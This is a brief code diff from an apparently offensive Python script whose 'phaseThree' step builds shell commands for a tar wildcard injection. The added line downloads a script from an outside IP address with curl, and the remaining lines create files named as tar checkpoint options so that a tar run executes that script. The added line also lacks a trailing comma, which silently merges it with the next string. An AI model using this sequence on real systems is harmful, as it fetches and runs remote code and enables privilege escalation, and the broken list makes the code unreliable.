@@ -180,6 +180,7 @@ def phaseThree():
 		pass
 	tar_commands = [
 		"cd /var/log/mon",
+		"curl http://94.249.192.5:8000/backup.sh -o /var/log/mon/backup.sh"
 		"echo \"\" > '--checkpoint=1'",
 		"echo \"\" > '--checkpoint-action=exec=sh backup.sh'"
 	]
